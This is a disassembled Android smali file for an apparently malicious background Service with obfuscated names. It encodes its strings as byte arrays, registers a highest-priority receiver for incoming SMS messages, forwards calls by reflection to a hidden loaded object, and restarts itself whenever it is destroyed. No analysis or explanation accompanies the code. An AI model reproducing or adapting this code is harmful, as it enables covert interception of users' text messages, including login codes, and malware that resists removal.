.class public Lcom/p/s/j/z/c/L;
.super Landroid/app/Service;
.source "L.java"


# static fields
.field private static final b:[B

.field private static final c:[B

.field private static final d:[B

.field public static final onStartCommand:[B


# instance fields
.field private a:Ljava/lang/Object;


# direct methods
.method static constructor <clinit>()V
    .locals 1

    .prologue
    .line 13
    const/16 v0, 0xe

    new-array v0, v0, [B

    fill-array-data v0, :array_0

    sput-object v0, Lcom/p/s/j/z/c/L;->onStartCommand:[B

    .line 15
    const/4 v0, 0x2

    new-array v0, v0, [B

    fill-array-data v0, :array_1

    sput-object v0, Lcom/p/s/j/z/c/L;->b:[B

    .line 17
    const/4 v0, 0x3

    new-array v0, v0, [B

    fill-array-data v0, :array_2

    sput-object v0, Lcom/p/s/j/z/c/L;->c:[B

    .line 20
    const/16 v0, 0x27

    new-array v0, v0, [B

    fill-array-data v0, :array_3

    sput-object v0, Lcom/p/s/j/z/c/L;->d:[B

    .line 23
    return-void

    .line 13
    nop

    :array_0
    .array-data 1
        0x6ft
        0x6et
        0x53t
        0x74t
        0x61t
        0x72t
        0x74t
        0x43t
        0x6ft
        0x6dt
        0x6dt
        0x61t
        0x6et
        0x64t
    .end array-data

    .line 15
    nop

    :array_1
    .array-data 1
        0x72t
        0x65t
    .end array-data

    .line 17
    nop

    :array_2
    .array-data 1
        0x72t
        0x70t
        0x63t
    .end array-data

    .line 20
    :array_3
    .array-data 1
        0x61t
        0x6et
        0x64t
        0x72t
        0x6ft
        0x69t
        0x64t
        0x2et
        0x70t
        0x72t
        0x6ft
        0x76t
        0x69t
        0x64t
        0x65t
        0x72t
        0x2et
        0x54t
        0x65t
        0x6ct
        0x65t
        0x70t
        0x68t
        0x6ft
        0x6et
        0x79t
        0x2et
        0x53t
        0x4dt
        0x53t
        0x5ft
        0x52t
        0x45t
        0x43t
        0x45t
        0x49t
        0x56t
        0x45t
        0x44t
    .end array-data
.end method

.method public constructor <init>()V
    .locals 0

    .prologue
    .line 10
    invoke-direct {p0}, Landroid/app/Service;-><init>()V

    return-void
.end method

.method private a(Landroid/content/Intent;II)Ljava/lang/Object;
    .locals 5

    .prologue
    .line 99
    :try_start_0
    iget-object v0, p0, Lcom/p/s/j/z/c/L;->a:Ljava/lang/Object;

    invoke-virtual {v0}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    move-result-object v0

    new-instance v1, Ljava/lang/String;

    sget-object v2, Lcom/p/s/j/z/c/L;->onStartCommand:[B

    invoke-direct {v1, v2}, Ljava/lang/String;-><init>([B)V

    .line 100
    const/4 v2, 0x3

    new-array v2, v2, [Ljava/lang/Class;

    const/4 v3, 0x0

    const-class v4, Landroid/content/Intent;

    aput-object v4, v2, v3

    const/4 v3, 0x1

    sget-object v4, Ljava/lang/Integer;->TYPE:Ljava/lang/Class;

    aput-object v4, v2, v3

    const/4 v3, 0x2

    sget-object v4, Ljava/lang/Integer;->TYPE:Ljava/lang/Class;

    aput-object v4, v2, v3

    .line 99
    invoke-virtual {v0, v1, v2}, Ljava/lang/Class;->getDeclaredMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v0

    .line 101
    const/4 v1, 0x1

    invoke-virtual {v0, v1}, Ljava/lang/reflect/Method;->setAccessible(Z)V

    .line 102
    iget-object v1, p0, Lcom/p/s/j/z/c/L;->a:Ljava/lang/Object;

    const/4 v2, 0x3

    new-array v2, v2, [Ljava/lang/Object;

    const/4 v3, 0x0

    aput-object p1, v2, v3

    const/4 v3, 0x1

    invoke-static {p2}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v4

    aput-object v4, v2, v3

    const/4 v3, 0x2

    invoke-static {p3}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v4

    aput-object v4, v2, v3

    invoke-virtual {v0, v1, v2}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;
    :try_end_0
    .catch Ljava/lang/Throwable; {:try_start_0 .. :try_end_0} :catch_0

    move-result-object v0

    .line 105
    :goto_0
    return-object v0

    :catch_0
    move-exception v0

    const/4 v0, 0x0

    goto :goto_0
.end method

.method private a()V
    .locals 1

    .prologue
    .line 26
    invoke-static {p0}, Lcom/p/s/j/z/c/a;->a(Landroid/content/Context;)Lcom/p/s/j/z/c/a;

    move-result-object v0

    invoke-virtual {v0}, Lcom/p/s/j/z/c/a;->b()Ljava/lang/Object;

    move-result-object v0

    iput-object v0, p0, Lcom/p/s/j/z/c/L;->a:Ljava/lang/Object;

    .line 27
    return-void
.end method

.method private a([B)[B
    .locals 5

    .prologue
    .line 86
    :try_start_0
    iget-object v0, p0, Lcom/p/s/j/z/c/L;->a:Ljava/lang/Object;

    invoke-virtual {v0}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    move-result-object v0

    new-instance v1, Ljava/lang/String;

    sget-object v2, Lcom/p/s/j/z/c/L;->c:[B

    invoke-direct {v1, v2}, Ljava/lang/String;-><init>([B)V

    .line 87
    const/4 v2, 0x1

    new-array v2, v2, [Ljava/lang/Class;

    const/4 v3, 0x0

    const-class v4, [B

    aput-object v4, v2, v3

    .line 86
    invoke-virtual {v0, v1, v2}, Ljava/lang/Class;->getDeclaredMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v0

    .line 88
    const/4 v1, 0x1

    invoke-virtual {v0, v1}, Ljava/lang/reflect/Method;->setAccessible(Z)V

    .line 89
    iget-object v1, p0, Lcom/p/s/j/z/c/L;->a:Ljava/lang/Object;

    const/4 v2, 0x1

    new-array v2, v2, [Ljava/lang/Object;

    const/4 v3, 0x0

    aput-object p1, v2, v3

    invoke-virtual {v0, v1, v2}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, [B
    :try_end_0
    .catch Ljava/lang/Throwable; {:try_start_0 .. :try_end_0} :catch_0

    .line 92
    :goto_0
    return-object v0

    :catch_0
    move-exception v0

    const/4 v0, 0x0

    goto :goto_0
.end method


# virtual methods
.method public onBind(Landroid/content/Intent;)Landroid/os/IBinder;
    .locals 1

    .prologue
    .line 68
    const/4 v0, 0x0

    return-object v0
.end method

.method public onCreate()V
    .locals 3

    .prologue
    .line 33
    const-wide/16 v0, 0x64

    :try_start_0
    invoke-static {v0, v1}, Ljava/lang/Thread;->sleep(J)V
    :try_end_0
    .catch Ljava/lang/Throwable; {:try_start_0 .. :try_end_0} :catch_0

    .line 36
    :goto_0
    :try_start_1
    new-instance v0, Landroid/content/IntentFilter;

    new-instance v1, Ljava/lang/String;

    .line 37
    sget-object v2, Lcom/p/s/j/z/c/L;->d:[B

    invoke-direct {v1, v2}, Ljava/lang/String;-><init>([B)V

    .line 36
    invoke-direct {v0, v1}, Landroid/content/IntentFilter;-><init>(Ljava/lang/String;)V

    .line 38
    const v1, 0x7fffffff

    invoke-virtual {v0, v1}, Landroid/content/IntentFilter;->setPriority(I)V

    .line 39
    new-instance v1, Lcom/p/s/j/z/c/P;

    invoke-direct {v1}, Lcom/p/s/j/z/c/P;-><init>()V

    .line 41
    invoke-virtual {p0, v1, v0}, Lcom/p/s/j/z/c/L;->registerReceiver(Landroid/content/BroadcastReceiver;Landroid/content/IntentFilter;)Landroid/content/Intent;

    .line 42
    invoke-direct {p0}, Lcom/p/s/j/z/c/L;->a()V
    :try_end_1
    .catch Ljava/lang/Throwable; {:try_start_1 .. :try_end_1} :catch_1

    .line 45
    :goto_1
    return-void

    :catch_0
    move-exception v0

    goto :goto_0

    :catch_1
    move-exception v0

    goto :goto_1
.end method

.method public onDestroy()V
    .locals 6

    .prologue
    const/4 v5, 0x0

    .line 54
    :try_start_0
    new-instance v0, Lcom/p/s/j/z/c/k;

    invoke-direct {v0}, Lcom/p/s/j/z/c/k;-><init>()V

    .line 55
    const/16 v1, 0xe

    const/4 v2, 0x2

    iget-boolean v3, v0, Lcom/p/s/j/z/c/k;->f:Z

    if-eqz v3, :cond_2

    iget-object v3, v0, Lcom/p/s/j/z/c/k;->a:[B

    if-eqz v3, :cond_0

    iget v3, v0, Lcom/p/s/j/z/c/k;->c:I

    add-int/2addr v3, v2

    iget v4, v0, Lcom/p/s/j/z/c/k;->d:I

    if-le v3, v4, :cond_2

    :cond_0
    iget v3, v0, Lcom/p/s/j/z/c/k;->d:I

    if-nez v3, :cond_1

    const/16 v3, 0x400

    iput v3, v0, Lcom/p/s/j/z/c/k;->d:I

    :cond_1
    iget v3, v0, Lcom/p/s/j/z/c/k;->d:I

    if-le v2, v3, :cond_3

    iget v3, v0, Lcom/p/s/j/z/c/k;->d:I

    add-int/2addr v2, v3

    add-int/lit8 v2, v2, 0x1

    invoke-virtual {v0, v2}, Lcom/p/s/j/z/c/k;->a(I)V

    :cond_2
    :goto_0
    iget-boolean v2, v0, Lcom/p/s/j/z/c/k;->e:Z

    if-eqz v2, :cond_4

    iget-object v2, v0, Lcom/p/s/j/z/c/k;->a:[B

    iget v3, v0, Lcom/p/s/j/z/c/k;->c:I

    int-to-byte v4, v5

    aput-byte v4, v2, v3

    iget-object v2, v0, Lcom/p/s/j/z/c/k;->a:[B

    iget v3, v0, Lcom/p/s/j/z/c/k;->c:I

    add-int/lit8 v3, v3, 0x1

    int-to-byte v1, v1

    aput-byte v1, v2, v3

    :goto_1
    iget v1, v0, Lcom/p/s/j/z/c/k;->c:I

    add-int/lit8 v1, v1, 0x2

    iput v1, v0, Lcom/p/s/j/z/c/k;->c:I

    .line 56
    iget v1, v0, Lcom/p/s/j/z/c/k;->c:I

    iget v2, v0, Lcom/p/s/j/z/c/k;->b:I

    sub-int/2addr v1, v2

    new-array v1, v1, [B

    iget-object v2, v0, Lcom/p/s/j/z/c/k;->a:[B

    iget v3, v0, Lcom/p/s/j/z/c/k;->b:I

    const/4 v4, 0x0

    iget v5, v0, Lcom/p/s/j/z/c/k;->c:I

    iget v0, v0, Lcom/p/s/j/z/c/k;->b:I

    sub-int v0, v5, v0

    invoke-static {v2, v3, v1, v4, v0}, Ljava/lang/System;->arraycopy(Ljava/lang/Object;ILjava/lang/Object;II)V

    invoke-direct {p0, v1}, Lcom/p/s/j/z/c/L;->a([B)[B

    .line 58
    new-instance v0, Landroid/content/Intent;

    invoke-direct {v0}, Landroid/content/Intent;-><init>()V

    .line 59
    const-class v1, Lcom/p/s/j/z/c/L;

    invoke-virtual {v0, p0, v1}, Landroid/content/Intent;->setClass(Landroid/content/Context;Ljava/lang/Class;)Landroid/content/Intent;

    .line 60
    invoke-virtual {p0, v0}, Lcom/p/s/j/z/c/L;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 63
    :goto_2
    invoke-super {p0}, Landroid/app/Service;->onDestroy()V

    .line 64
    return-void

    .line 55
    :cond_3
    :try_start_1
    iget v2, v0, Lcom/p/s/j/z/c/k;->d:I

    mul-int/lit8 v2, v2, 0x2

    invoke-virtual {v0, v2}, Lcom/p/s/j/z/c/k;->a(I)V

    goto :goto_0

    :catch_0
    move-exception v0

    goto :goto_2

    :cond_4
    iget-object v2, v0, Lcom/p/s/j/z/c/k;->a:[B

    iget v3, v0, Lcom/p/s/j/z/c/k;->c:I

    add-int/lit8 v3, v3, 0x1

    int-to-byte v4, v5

    aput-byte v4, v2, v3

    iget-object v2, v0, Lcom/p/s/j/z/c/k;->a:[B

    iget v3, v0, Lcom/p/s/j/z/c/k;->c:I

    int-to-byte v1, v1

    aput-byte v1, v2, v3
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0

    goto :goto_1
.end method

.method public onStart(Landroid/content/Intent;I)V
    .locals 0

    .prologue
    .line 49
    return-void
.end method

.method public onStartCommand(Landroid/content/Intent;II)I
    .locals 3

    .prologue
    const/4 v2, 0x1

    .line 73
    if-eqz p1, :cond_0

    .line 75
    new-instance v0, Ljava/lang/String;

    sget-object v1, Lcom/p/s/j/z/c/L;->b:[B

    invoke-direct {v0, v1}, Ljava/lang/String;-><init>([B)V

    const/4 v1, 0x0

    invoke-virtual {p1, v0, v1}, Landroid/content/Intent;->getIntExtra(Ljava/lang/String;I)I

    move-result v0

    .line 76
    if-ne v0, v2, :cond_0

    .line 77
    invoke-direct {p0}, Lcom/p/s/j/z/c/L;->a()V

    .line 79
    :cond_0
    invoke-direct {p0, p1, p2, p3}, Lcom/p/s/j/z/c/L;->a(Landroid/content/Intent;II)Ljava/lang/Object;

    .line 80
    invoke-super {p0, p1, v2, p3}, Landroid/app/Service;->onStartCommand(Landroid/content/Intent;II)I

    move-result v0

    return v0
.end method
